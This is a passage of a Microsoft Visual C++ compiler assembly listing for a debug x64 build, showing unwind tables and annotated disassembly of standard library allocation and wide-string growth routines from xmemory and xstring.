	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$allocator@_W@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c002dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030023H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_array_new_length@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_alloc@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@AEAA@QEBD@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?what@exception@std@@UEBAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1exception@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBDH@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max@?$numeric_limits@_J@std@@SA_JXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??2@YAPEAX_KPEAX@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$RtlSecureZeroMemory DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Block_size$ = 8
_Ptr_container$ = 40
_Ptr$ = 72
_Bytes$ = 320
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN12:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 141  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00026	48 83 c0 27	 add	 rax, 39			; 00000027H
  0002a	48 89 45 08	 mov	 QWORD PTR _Block_size$[rbp], rax

; 143  :     if (_Block_size <= _Bytes) {

  0002e	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00035	48 39 45 08	 cmp	 QWORD PTR _Block_size$[rbp], rax
  00039	77 05		 ja	 SHORT $LN8@Allocate_m

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0003b	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN8@Allocate_m:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  00040	48 8b 4d 08	 mov	 rcx, QWORD PTR _Block_size$[rbp]
  00044	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00049	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax
$LN4@Allocate_m:

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0004d	48 83 7d 28 00	 cmp	 QWORD PTR _Ptr_container$[rbp], 0
  00052	74 02		 je	 SHORT $LN9@Allocate_m
  00054	eb 0b		 jmp	 SHORT $LN10@Allocate_m
$LN9@Allocate_m:
$LN7@Allocate_m:
  00056	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0005b	33 c0		 xor	 eax, eax
  0005d	85 c0		 test	 eax, eax
  0005f	75 f5		 jne	 SHORT $LN7@Allocate_m
$LN10@Allocate_m:
  00061	33 c0		 xor	 eax, eax
  00063	85 c0		 test	 eax, eax
  00065	75 e6		 jne	 SHORT $LN4@Allocate_m

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00067	48 8b 45 28	 mov	 rax, QWORD PTR _Ptr_container$[rbp]
  0006b	48 83 c0 27	 add	 rax, 39			; 00000027H
  0006f	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H
  00073	48 89 45 48	 mov	 QWORD PTR _Ptr$[rbp], rax

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00077	b8 08 00 00 00	 mov	 eax, 8
  0007c	48 6b c0 ff	 imul	 rax, rax, -1
  00080	48 8b 4d 48	 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00084	48 8b 55 28	 mov	 rdx, QWORD PTR _Ptr_container$[rbp]
  00088	48 89 14 01	 mov	 QWORD PTR [rcx+rax], rdx

; 151  : 
; 152  : #ifdef _DEBUG
; 153  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 154  : #endif // defined(_DEBUG)
; 155  :     return _Ptr;

  0008c	48 8b 45 48	 mov	 rax, QWORD PTR _Ptr$[rbp]
$LN11@Allocate_m:

; 156  : }

  00090	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  00097	5f		 pop	 rdi
  00098	5d		 pop	 rbp
  00099	c3		 ret	 0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Overflow_is_possible$ = 4
_Max_possible$1 = 40
_Count$ = 288
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

  0001f	c6 45 04 01	 mov	 BYTE PTR _Overflow_is_possible$[rbp], 1

; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;

  00023	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0002d	48 89 45 28	 mov	 QWORD PTR _Max_possible$1[rbp], rax

; 73   :         if (_Count > _Max_possible) {

  00031	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0003b	48 39 85 20 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00042	76 05		 jbe	 SHORT $LN2@Get_size_o

; 74   :             _Throw_bad_array_new_length(); // multiply overflow

  00044	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN2@Get_size_o:

; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00049	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00050	48 d1 e0	 shl	 rax, 1
$LN3@Get_size_o:

; 79   : }

  00053	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z PROC ; std::_Allocate<16,std::_Default_allocate_traits,0>, COMDAT

; 234  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 235  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 236  : #if defined(_M_IX86) || defined(_M_X64)
; 237  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 238  :     if (!_STD is_constant_evaluated())
; 239  : #endif // _HAS_CXX20
; 240  :     {
; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001f	48 81 bd e0 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002a	72 0e		 jb	 SHORT $LN2@Allocate

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  0002c	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00033	e8 00 00 00 00	 call	 ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
  00038	eb 1a		 jmp	 SHORT $LN1@Allocate
$LN2@Allocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  0003a	48 83 bd e0 00
	00 00 00	 cmp	 QWORD PTR _Bytes$[rbp], 0
  00042	74 0e		 je	 SHORT $LN3@Allocate

; 248  :         return _Traits::_Allocate(_Bytes);

  00044	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  0004b	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00050	eb 02		 jmp	 SHORT $LN1@Allocate
$LN3@Allocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00052	33 c0		 xor	 eax, eax
$LN1@Allocate:

; 252  : }

  00054	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ENDP ; std::_Allocate<16,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Count$ = 232
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  0002b	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  0002e	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00035	e8 00 00 00 00	 call	 ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate

; 2212 :     }
; 2213 : }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
_TEXT	SEGMENT
_My_data$ = 8
_Old_size$ = 40
_New_size$ = 72
_Old_capacity$ = 104
_New_capacity$ = 136
_Al$ = 168
_New_ptr$ = 200
_Raw_new$ = 232
_Old_ptr$5 = 264
__$ArrayPad$ = 472
this$ = 512
_Size_increase$ = 520
_Fn$ = 528
<_Args_0>$ = 536
<_Args_1>$ = 544
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>, COMDAT

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

$LN6:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 88 44 24 18	 mov	 BYTE PTR [rsp+24], r8b
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 18 02
	00 00		 sub	 rsp, 536		; 00000218H
  0001d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00022	48 8d 7c 24 30	 lea	 rdi, QWORD PTR [rsp+48]
  00027	b9 4a 00 00 00	 mov	 ecx, 74			; 0000004aH
  0002c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00031	f3 ab		 rep stosd
  00033	48 8b 8c 24 38
	02 00 00	 mov	 rcx, QWORD PTR [rsp+568]
  0003b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00042	48 33 c5	 xor	 rax, rbp
  00045	48 89 85 d8 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00053	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00058	48 8b 85 00 02
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0005f	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  00063	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00067	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]
  0006b	48 89 45 28	 mov	 QWORD PTR _Old_size$[rbp], rax

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  0006f	48 8b 8d 00 02
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00076	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  0007b	48 2b 45 28	 sub	 rax, QWORD PTR _Old_size$[rbp]
  0007f	48 3b 85 08 02
	00 00		 cmp	 rax, QWORD PTR _Size_increase$[rbp]
  00086	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00088	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0008d	48 8b 85 08 02
	00 00		 mov	 rax, QWORD PTR _Size_increase$[rbp]
  00094	48 8b 4d 28	 mov	 rcx, QWORD PTR _Old_size$[rbp]
  00098	48 03 c8	 add	 rcx, rax
  0009b	48 8b c1	 mov	 rax, rcx
  0009e	48 89 45 48	 mov	 QWORD PTR _New_size$[rbp], rax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  000a2	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000a6	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  000aa	48 89 45 68	 mov	 QWORD PTR _Old_capacity$[rbp], rax

; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  000ae	48 8b 55 48	 mov	 rdx, QWORD PTR _New_size$[rbp]
  000b2	48 8b 8d 00 02
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000b9	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  000be	48 89 85 88 00
	00 00		 mov	 QWORD PTR _New_capacity$[rbp], rax

; 4819 :         auto& _Al                     = _Getal();

  000c5	48 8b 8d 00 02
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000cc	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  000d1	48 89 85 a8 00
	00 00		 mov	 QWORD PTR _Al$[rbp], rax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  000d8	48 8d 95 88 00
	00 00		 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  000df	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  000e6	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  000eb	48 89 85 c8 00
	00 00		 mov	 QWORD PTR _New_ptr$[rbp], rax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  000f2	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  000f6	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  000fb	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000ff	48 8b 4d 48	 mov	 rcx, QWORD PTR _New_size$[rbp]
  00103	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 4825 :         _My_data._Myres       = _New_capacity;

  00107	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0010b	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  00112	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00116	48 8b 8d c8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  0011d	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  00122	48 89 85 e8 00
	00 00		 mov	 QWORD PTR _Raw_new$[rbp], rax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00129	48 83 7d 68 07	 cmp	 QWORD PTR _Old_capacity$[rbp], 7
  0012e	76 73		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  00130	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00134	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00137	48 89 85 08 01
	00 00		 mov	 QWORD PTR _Old_ptr$5[rbp], rax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  0013e	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Old_ptr$5[rbp]
  00145	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0014a	48 8b 8d 20 02
	00 00		 mov	 rcx, QWORD PTR <_Args_1>$[rbp]
  00151	48 89 4c 24 28	 mov	 QWORD PTR [rsp+40], rcx
  00156	48 8b 8d 18 02
	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  0015d	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  00162	4c 8b 4d 28	 mov	 r9, QWORD PTR _Old_size$[rbp]
  00166	4c 8b c0	 mov	 r8, rax
  00169	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Raw_new$[rbp]
  00170	48 8d 8d 10 02
	00 00		 lea	 rcx, QWORD PTR _Fn$[rbp]
  00177	e8 00 00 00 00	 call	 ??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

